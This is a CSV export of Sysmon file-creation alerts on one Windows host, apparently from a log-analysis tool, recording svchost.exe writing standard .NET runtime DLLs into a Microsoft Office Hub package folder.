"2025-12-26 11:29:12.120 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",175073,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\shared\Microsoft.NETCore.App\8.0.20\System.Net.HttpListener.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.119 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.119","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.120 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",175074,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\shared\Microsoft.NETCore.App\8.0.20\System.Net.Mail.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.120 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.120","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.125 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",175075,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\shared\Microsoft.NETCore.App\8.0.20\System.Net.NameResolution.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.120 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.120","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.126 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",175076,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\shared\Microsoft.NETCore.App\8.0.20\System.Net.NetworkInformation.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.120 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.120","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.127 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",175077,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\shared\Microsoft.NETCore.App\8.0.20\System.Net.Ping.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.120 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.120","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.127 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",175078,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\shared\Microsoft.NETCore.App\8.0.20\System.Net.Primitives.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.120 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.122","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.127 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",175079,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\shared\Microsoft.NETCore.App\8.0.20\System.Net.Quic.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.122 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.122","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.127 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",175080,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\shared\Microsoft.NETCore.App\8.0.20\System.Net.Requests.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.122 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.122","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.127 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",175081,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\shared\Microsoft.NETCore.App\8.0.20\System.Net.Security.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.122 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.122","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.127 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",175082,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\shared\Microsoft.NETCore.App\8.0.20\System.Net.ServicePoint.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.124 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.124","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.127 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",175083,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\shared\Microsoft.NETCore.App\8.0.20\System.Net.Sockets.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.124 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.124","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.127 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",175084,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\shared\Microsoft.NETCore.App\8.0.20\System.Net.WebClient.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.124 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.124","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.127 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",175085,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\shared\Microsoft.NETCore.App\8.0.20\System.Net.WebHeaderCollection.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.124 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.124","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.127 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",175086,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\shared\Microsoft.NETCore.App\8.0.20\System.Net.WebProxy.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.124 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.124","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.127 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",175087,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\shared\Microsoft.NETCore.App\8.0.20\System.Net.WebSockets.Client.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.126 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.126","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.139 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",175088,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\shared\Microsoft.NETCore.App\8.0.20\System.Net.WebSockets.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.126 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.126","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.139 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",175089,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\shared\Microsoft.NETCore.App\8.0.20\System.Numerics.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.126 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.126","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.139 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",175090,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\shared\Microsoft.NETCore.App\8.0.20\System.Numerics.Vectors.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.126 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.128","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.139 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",175091,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\shared\Microsoft.NETCore.App\8.0.20\System.ObjectModel.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.128 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.128","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.139 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",175092,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\shared\Microsoft.NETCore.App\8.0.20\System.Private.CoreLib.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.128 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.128","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.139 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",175093,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\shared\Microsoft.NETCore.App\8.0.20\System.Private.DataContractSerialization.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.128 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.130","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.139 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",175094,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\shared\Microsoft.NETCore.App\8.0.20\System.Private.Uri.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.130 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.130","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.139 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",175095,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\shared\Microsoft.NETCore.App\8.0.20\System.Private.Xml.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.130 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.130","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.139 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",175096,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\shared\Microsoft.NETCore.App\8.0.20\System.Private.Xml.Linq.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.130 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.130","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.139 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",175097,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\shared\Microsoft.NETCore.App\8.0.20\System.Reflection.DispatchProxy.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.132 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.132","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.139 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",175098,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\shared\Microsoft.NETCore.App\8.0.20\System.Reflection.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.132 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.132","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.139 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",175099,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\shared\Microsoft.NETCore.App\8.0.20\System.Reflection.Emit.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.132 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.132","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.139 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",175100,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\shared\Microsoft.NETCore.App\8.0.20\System.Reflection.Emit.ILGeneration.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.132 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.132","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.140 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",175101,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\shared\Microsoft.NETCore.App\8.0.20\System.Reflection.Emit.Lightweight.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.134 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.134","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.140 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",175102,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\shared\Microsoft.NETCore.App\8.0.20\System.Reflection.Extensions.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.134 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.134","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.140 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",175103,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\shared\Microsoft.NETCore.App\8.0.20\System.Reflection.Metadata.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.134 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.134","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.140 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",175104,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\shared\Microsoft.NETCore.App\8.0.20\System.Reflection.Primitives.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.136 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.136","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.140 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",175105,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\shared\Microsoft.NETCore.App\8.0.20\System.Reflection.TypeExtensions.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.136 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.136","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.140 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",175106,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\shared\Microsoft.NETCore.App\8.0.20\System.Resources.Reader.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.136 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.136","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.140 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",175107,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\shared\Microsoft.NETCore.App\8.0.20\System.Resources.ResourceManager.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.136 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.136","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.140 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",175108,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\shared\Microsoft.NETCore.App\8.0.20\System.Resources.Writer.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.138 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.138","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.140 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",175109,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\shared\Microsoft.NETCore.App\8.0.20\System.Runtime.CompilerServices.Unsafe.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.138 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.138","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
